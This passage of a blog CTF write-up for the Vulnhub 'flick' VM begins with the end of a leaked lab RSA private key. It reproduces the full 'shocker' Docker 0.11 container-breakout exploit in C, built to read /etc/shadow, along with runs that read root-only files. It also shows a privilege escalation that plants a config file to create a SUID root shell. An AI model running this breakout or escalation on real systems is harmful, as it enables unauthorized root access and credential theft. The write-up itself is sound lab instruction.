JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
-----END RSA PRIVATE KEY-----
dean@flick:~$ 
</code></pre>

<p><img src="http://cdn.gifbay.com/2012/10/what_the_hell_just_happened-7962.gif" alt="" /></p>

<p>OK, so, I&rsquo;ll put that into a file then and log in as Robin.</p>

<pre><code class="bash">dean@flick:~$ ./read_docker ./ &gt; robin.priv
dean@flick:~$ chmod 600 ./robin.priv
dean@flick:~$ ssh -i robin.priv robin@127.0.0.1

 .o88o. oooo   o8o            oooo
 888 `" `888   `"'            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88' `"Y8  888 .8P'
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P' o888o o888o 

Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Aug 13 00:31:14 SAST 2014

  System load:  0.0               Processes:              91
  Usage of /:   39.7% of 6.99GB   Users logged in:        1
  Memory usage: 51%               IP address for eth0:    192.168.0.106
  Swap usage:   1%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

79 packages can be updated.
51 updates are security updates.

New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Aug 13 00:16:47 2014 from 192.168.0.110
robin@flick:~$ 
</code></pre>

<hr />

<h2>Docker all the Things !</h2>

<p>Robin can sudo /opt/start_apache/restart.sh without a password, as shown by running sudo -l</p>

<pre><code class="bash">robin@flick:~$ sudo -l
Matching Defaults entries for robin on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on this host:
    (root) NOPASSWD: /opt/start_apache/restart.sh
robin@flick:~$
</code></pre>

<p>This shell script seems to restart the Apache servers when run</p>

<pre><code class="bash">robin@flick:~$ sudo /opt/start_apache/restart.sh
 * Restarting web server apache2                                                                                        apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
                                                                                                                 [ OK ]
start_apache-8000: stopped
start_apache-8000: started
robin@flick:~$
</code></pre>

<p>The file cannot be viewed, as the permissions prevent it</p>

<pre><code class="bash">robin@flick:~$ ls -l /opt/start_apache/
total 8
-rwx------ 1 root root   79 Aug  4 17:04 restart.sh
-rwx------ 1 root root 2285 Aug  4 17:09 start.py
robin@flick:~$
</code></pre>

<p>There&rsquo;s got to be another way to read that file to see what it&rsquo;s doing. Further poking around resulted in me finding out that Docker is installed (Docker is quite cool - take a look). However, as with any application, there are vulnerabilities.</p>

<p>The docker version command shows us the server is running version 0.11</p>

<pre><code class="bash">robin@flick:~$ docker version
Client version: 0.11.0
Client API version: 1.11
Go version (client): go1.2.1
Git commit (client): 15209c3
Server version: 0.11.0
Server API version: 1.11
Git commit (server): 15209c3
Go version (server): go1.2.1
Last stable version: 1.1.2, please update docker
robin@flick:~$
</code></pre>

<p>Which, according to <a href="http://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/">this site</a>, is vulnerable to a container breakout. The blog indicates that there is PoC code out in the wild - so off I went to find it. Turns out it&rsquo;s <a href="https://github.com/gabrtv/shocker">on github</a>, obviously.</p>

<p>OK, so lets clone the repo to the local machine and have a look at the code</p>

<pre><code class="bash">robin@flick:~$ git clone https://github.com/gabrtv/shocker
Cloning into 'shocker'...
remote: Counting objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0)
Unpacking objects: 100% (27/27), done.
robin@flick:~$
</code></pre>

<pre><code class="c">/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer
 *
 * Demonstrates that any given docker image someone is asking
 * you to run in your docker setup can access ANY file on your host,
 * e.g. dumping hosts /etc/shadow or other sensitive info, compromising
 * security of the host and any other docker VM's on it.
 *
 * docker using container based VMM: Sebarate pid and net namespace,
 * stripped caps and RO bind mounts into container's /. However
 * as its only a bind-mount the fs struct from the task is shared
 * with the host which allows to open files by file handles
 * (open_by_handle_at()). As we thankfully have dac_override and
 * dac_read_search we can do this. The handle is usually a 64bit
 * string with 32bit inodenumber inside (tested with ext4).
 * Inode of / is always 2, so we have a starting point to walk
 * the FS path and brute force the remaining 32bit until we find the
 * desired file (It's probably easier, depending on the fhandle export
 * function used for the FS in question: it could be a parent inode# or
 * the inode generation which can be obtained via an ioctl).
 * [In practise the remaining 32bit are all 0 :]
 *
 * tested with docker 0.11 busybox demo image on a 3.11 kernel:
 *
 * docker run -i busybox sh
 *
 * seems to run any program inside VMM with UID 0 (some caps stripped); if
 * user argument is given, the provided docker image still
 * could contain +s binaries, just as demo busybox image does.
 *
 * PS: You should also seccomp kexec() syscall :)
 * PPS: Might affect other container based compartments too
 *
 * $ cc -Wall -std=c99 -O2 shocker.c -static
 */

#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dirent.h&gt;
#include &lt;stdint.h&gt;

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h-&gt;handle_bytes,
            h-&gt;handle_type);
    for (int i = 0; i &lt; h-&gt;handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h-&gt;f_handle[i]);
        if ((i + 1) % 20 == 0)
            fprintf(stderr,"\n");
        if (i &lt; h-&gt;handle_bytes - 1)
            fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
        .handle_bytes = 8,
        .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;

    path = strchr(path, '/');

    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh-&gt;f_handle, ih-&gt;f_handle, sizeof(oh-&gt;f_handle));
        oh-&gt;handle_type = 1;
        oh-&gt;handle_bytes = 8;
        return 1;
    }
    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);

    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) &lt; 0)
        die("[-] open_by_handle_at");

    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");

    for (;;) {
        de = readdir(dir);
        if (!de)
            break;
        fprintf(stderr, "[*] Found %s\n", de-&gt;d_name);
        if (strncmp(de-&gt;d_name, path, strlen(de-&gt;d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de-&gt;d_name, (int)de-&gt;d_ino);
            ino = de-&gt;d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");

    if (de) {
        for (uint32_t i = 0; i &lt; 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &amp;ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &amp;i, sizeof(i));

            if ((i % (1&lt;&lt;20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de-&gt;d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&amp;outh, 0) &gt; 0) {
                closedir(dir);
                close(fd);
                dump_handle(&amp;outh);
                return find_handle(bfd, path, &amp;outh, oh);
            }
        }
    }

    closedir(dir);
    close(fd);
    return 0;
}

int main()
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
           "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
           "[***] If you have pending sec consulting, I'll happily     [***]\n"
           "[***] forward to my friends who drink secury-tea too!      [***]\n");

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/.dockerinit", O_RDONLY)) &lt; 0)
        die("[-] open");

    if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&amp;h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_RDONLY)) &lt; 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) &lt; 0)
        die("[-] read");

    fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);

    close(fd2); close(fd1);

    return 0;
}
</code></pre>

<p>Looks like it&rsquo;s a simple case of replacing the following line with the file to read</p>

<pre><code class="c">if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
</code></pre>

<p>I thought I could be sneaky here and request /root/flag.txt, so I edited the source code, and compiled it as per the instructions</p>

<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.4 kB
Uploading context
Step 0 : FROM ubuntu
 ---&gt; ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 ---&gt; Using cache
 ---&gt; fe0bdac7e278
Step 2 : ADD . /app
 ---&gt; b1c818249f2f
Removing intermediate container 80d78a2e42ff
Step 3 : WORKDIR /app
 ---&gt; Running in b670431898c9
 ---&gt; a8aea5e1a755
Removing intermediate container b670431898c9
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 ---&gt; Running in a19ed14d76b6
 ---&gt; 391372de38ec
Removing intermediate container a19ed14d76b6
Step 5 : CMD ["./shocker"]
 ---&gt; Running in 1572b7cb39e5
 ---&gt; 6a588733f8ce
Removing intermediate container 1572b7cb39e5
Successfully built 6a588733f8ce
robin@flick:~$ docker run shocker/shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'root/flag.txt'
[*] Found .
[*] Found mnt
[*] Found home
[*] Found root
[+] Match: root ino=130833
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'flag.txt'
[*] Found .
[*] Found .bashrc
[*] Found .Xauthority
[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[*] Found flag.txt
[+] Match: flag.txt ino=165017
[*] Brute forcing remaining 32bit. This can take a while...
[*] (flag.txt) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /root/flag.txt output follows:
Errr, you are close, but this is not the flag you are looking for.

robin@flick:~$
</code></pre>

<p>Wow, 1 it worked, and 2 this is not the flag you are looking for</p>

<p><img src="http://motorcycleradio.us/wp-content/uploads/2014/07/mindtrick.gif" alt="" /></p>

<p>I did notice, however, that it provides a directory listing when trying to find the file requested. There&rsquo;s a folder or file called 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc. I wonder if that is either the flag, or if the flag is in it ?</p>

<p>Firstly lets try requesting it as a file by changing the source code, compile and run it</p>

<pre><code class="c">if (find_handle(fd1, "/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc", &amp;root_h, &amp;h) &lt;= 0)
</code></pre>

<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.9 kB
Uploading context
Step 0 : FROM ubuntu
 ---&gt; ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 ---&gt; Using cache
 ---&gt; fe0bdac7e278
Step 2 : ADD . /app
 ---&gt; 4ccef4da8ae5
Removing intermediate container 8cb273148a08
Step 3 : WORKDIR /app
 ---&gt; Running in 661ce7955eae
 ---&gt; 66c9d4b419e6
Removing intermediate container 661ce7955eae
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 ---&gt; Running in 969fcb8e2910
 ---&gt; edd283652f36
Removing intermediate container 969fcb8e2910
Step 5 : CMD ["./shocker"]
 ---&gt; Running in bbadcbb89ef2
 ---&gt; 41afb4ce762a
Removing intermediate container bbadcbb89ef2
Successfully built 41afb4ce762a
robin@flick:~$ docker run shocker/shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc'
[*] Found .
[*] Found mnt
[*] Found home
[*] Found root
[+] Match: root ino=130833
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving '53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc'
[*] Found .
[*] Found .bashrc
[*] Found .Xauthority
[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
[*] Brute forcing remaining 32bit. This can take a while...
[*] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[-] read: Is a directory
robin@flick:~$
</code></pre>

<p>It&rsquo;s a directory, so we need to know the file name. If I request a random filename, I will still get a folder listing, so changing the source code to</p>

<pre><code class="c">if (find_handle(fd1, "/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt", &amp;root_h, &amp;h) &lt;= 0)
</code></pre>

<p>results in the following when compiled and run</p>

<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.9 kB
Uploading context
Step 0 : FROM ubuntu
 ---&gt; ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 ---&gt; Using cache
 ---&gt; fe0bdac7e278
Step 2 : ADD . /app
 ---&gt; 218b0633106e
Removing intermediate container 2a354d2d7c4b
Step 3 : WORKDIR /app
 ---&gt; Running in 957ed6b77fb3
 ---&gt; bbcee63e4d51
Removing intermediate container 957ed6b77fb3
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 ---&gt; Running in e283824b6a69
 ---&gt; 7e02f111f1eb
Removing intermediate container e283824b6a69
Step 5 : CMD ["./shocker"]
 ---&gt; Running in ef8d73127be9
 ---&gt; f532278bdca2
Removing intermediate container ef8d73127be9
Successfully built f532278bdca2
robin@flick:~$ docker run shocker/shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt'
[*] Found .
[*] Found mnt
[*] Found home
[*] Found root
[+] Match: root ino=130833
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving '53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt'
[*] Found .
[*] Found .bashrc
[*] Found .Xauthority
[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
[*] Brute forcing remaining 32bit. This can take a while...
[*] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'random.txt'
[*] Found .
[*] Found real_flag.txt
[*] Found ..
[*] Brute forcing remaining 32bit. This can take a while...
[-] Cannot find valid handle!: Bad file descriptor
robin@flick:~$
</code></pre>

<p>Our flag is actually called real_flag.txt, so a quick edit, compile and run, and we have the flag !</p>

<pre><code class="c">if (find_handle(fd1, "/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt", &amp;root_h, &amp;h) &lt;= 0)
</code></pre>

<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.9 kB
Uploading context
Step 0 : FROM ubuntu
 ---&gt; ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 ---&gt; Using cache
 ---&gt; fe0bdac7e278
Step 2 : ADD . /app
 ---&gt; c70bb87b476f
Removing intermediate container 9dc4cbb04db9
Step 3 : WORKDIR /app
 ---&gt; Running in 77dfcfa2bdd0
 ---&gt; e376b09e495d
Removing intermediate container 77dfcfa2bdd0
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 ---&gt; Running in 6d5d7089896d
 ---&gt; f3140f828bfc
Removing intermediate container 6d5d7089896d
Step 5 : CMD ["./shocker"]
 ---&gt; Running in 481824a260cb
 ---&gt; 2c7032dcfbd2
Removing intermediate container 481824a260cb
Successfully built 2c7032dcfbd2
robin@flick:~$ docker run shocker/shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt'
[*] Found .
[*] Found mnt
[*] Found home
[*] Found root
[+] Match: root ino=130833
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving '53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt'
[*] Found .
[*] Found .bashrc
[*] Found .Xauthority
[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
[*] Brute forcing remaining 32bit. This can take a while...
[*] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'real_flag.txt'
[*] Found .
[*] Found real_flag.txt
[+] Match: real_flag.txt ino=165015
[*] Brute forcing remaining 32bit. This can take a while...
[*] (real_flag.txt) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc output follows:
Congrats!

You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it

ciao for now!
@leonjza

robin@flick:~$
</code></pre>

<p><img src="http://stream1.gifsoup.com/webroot/animatedgifs/1024795_o.gif" alt="" /></p>

<hr />

<h2>I&rsquo;m Always After the Bonus Points</h2>

<p>So, on Vulnhub, the text for Flick has this line in it</p>

<pre><code class="text">As a bonus, can you get root command execution?
</code></pre>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg" alt="challenge_accepted" /></a></p>

<p>Using the aforementioned Docker Container Breakout vulnerability, I read the contents of /opt/start_apache/restart.sh</p>

<pre><code class="bash">#!/bin/sh
/usr/sbin/service apache2 restart
/usr/bin/supervisorctl restart all
</code></pre>

<p>OK, so, it&rsquo;s restarting apache and restarting all processes controlled by Supervisord. Supervisord stores config files in /etc/supervisor/conf.d. Using the Docker vuln to blind enumerate the files, I located /etc/supervisor/conf.d/start_apache.conf which I read</p>

<pre><code class="text">[program:start_apache]
command=/opt/start_apache/start.py
process_name = %(program_name)s-80%(process_num)02d
stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
stdout_logfile_maxbytes=100MB
stdout_logfile_backups=10
numprocs=1
directory=/opt/start_apache
stopwaitsecs=1
user=root
stopasgroup=true
</code></pre>

<p>/usr/bin/supervisorctl restart all is running /opt/start_apache/start.py. That&rsquo;s the next file I read with the Docker vuln</p>

<pre><code class="python">#!/usr/bin/python
'''
    Simple socket server using threads. Used in the flick CTF
    Credit: http://www.binarytides.com/python-socket-server-code-example/
'''

import socket
import os, sys, signal
from thread import *
import subprocess

# import the directory containing our config, and prevent the bytcode writes
sys.dont_write_bytecode = True

# see if /tmp has a configuration to load.
# Debugging purposes only!!!
if os.path.isfile('/tmp/config.py'):
    sys.path.insert(0, '/tmp')
else:
    sys.path.insert(0, '/etc')

# import the config
from config import config

HOST = ''   # Symbolic name meaning all available interfaces
PORT = 8881 # Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

#Start listening on socket
s.listen(10)

#Function for handling connections. This will be used to create threads
def clientthread(conn):

    #Sending message to connected client
    conn.send('Welcome to the admin server. A correct password will \'flick\' the switch and open a new door:\n&gt; ') #send only takes string

    #infinite loop so that function do not terminate and thread do not end.
    while True:

        #Receiving from client
        data = conn.recv(1024)
        reply = 'OK: ' + data
        if not data:
            break

    # check if the password is tabupJievas8Knoj
    if data.strip() == 'tabupJievas8Knoj':
        return_code = subprocess.call(config['command'], shell=True)
        if return_code == 0:
            reply += '\nAccepted! The door should be open now :poolparty:\n'
        else:
            reply += '\nAccepted, but it doesn\'t look like the door opened :&lt;\n'

    # add the prompt again
    reply += '\n&gt; '

        conn.sendall(reply)
    #came out of loop
    conn.close()

#now keep talking with the client
while 1:
    #wait to accept a connection - blocking call
    conn, addr = s.accept()

    #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
    start_new_thread(clientthread ,(conn,))

s.close()
</code></pre>

<p>This script is the script that provides the service found on port 8881, and seems to get it&rsquo;s config from /tmp/config.py, and if that doesn&rsquo;t exist, /etc/config.py. I read /etc/config.py to get an idea of the syntax</p>

<pre><code class="python">config = {
    'command': 'service apache2 restart'
}
</code></pre>

<p>Pretty simple. I can use this to execute a set of commands by creating /tmp/config.py with the following contents - this will take a copy of /bin/sh and put it in /tmp called rootshell, then set the SUID bit.</p>

<pre><code class="python">config = {
    'command': 'cp /bin/sh /tmp/rootshell &amp;&amp; chmod 4777 /tmp/rootshell'
}
</code></pre>

<p>Now, when I run the /opt/start_apache/restart.sh script, /opt/start_apache/start.py will be run, which will result in /tmp/config.py being read instead of /etc/config.py.</p>

<pre><code class="bash">robin@flick:~$ sudo /opt/start_apache/restart.sh
 * Restarting web server apache2                                                                                                                                              apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
                                                                                                                                                                       [ OK ]
start_apache-8000: stopped
start_apache-8000: started
robin@flick:~$
</code></pre>

<p>Now, we know that typing the correct password runs the command - we know this firstly from the source code, and secondly because we used it to start the web server right at the beginning. All I should need to do is connect to port 8881, and type the correct password. It should then run my malicious command.</p>

<pre><code class="bash">root@pwk:~# nc 192.168.0.106 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
&gt; tabupJievas8Knoj
OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

&gt;
</code></pre>

<p>Fingers crossed there&rsquo;s a rootshell file in /tmp</p>

<pre><code class="bash">robin@flick:~$ ls -l /tmp
total 112
-rwxrwxrwx 1 robin robin     82 Aug 12 13:59 config.py
-rwsrwxrwx 1 root  root  109768 Aug 13 01:08 rootshell
robin@flick:~$
</code></pre>

<p>Well, what do you know - it worked ! Running /tmp/rootshell drops us to a root shell, where we can properly read the flag, and put our public key into authorized_keys.</p>

<pre><code class="bash">robin@flick:~$ /tmp/rootshell
# id
uid=1000(robin) gid=1000(robin) euid=0(root) groups=0(root),999(docker),1000(robin)
# 
</code></pre>

<p>And for completeness, an SSH session as root.</p>

<pre><code class="bash">root@pwk:~# ssh root@192.168.0.106

 .o88o. oooo   o8o            oooo
 888 `" `888   `"'            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88' `"Y8  888 .8P'
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P' o888o o888o 

Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Aug 13 01:11:18 SAST 2014

  System load:  0.0               Processes:              90
  Usage of /:   39.8% of 6.99GB   Users logged in:        2
  Memory usage: 41%               IP address for eth0:    192.168.0.106
  Swap usage:   1%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

79 packages can be updated.
51 updates are security updates.

New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Aug 13 00:59:56 2014 from 192.168.0.110
root@flick:~# id
uid=0(root) gid=0(root) groups=0(root)
root@flick:~#
</code></pre>

<p><img src="http://gifstumblr.com/images/haters-gonna-hate_1042.gif" alt="" /></p>
]]></content>
  </entry>
  
</feed>
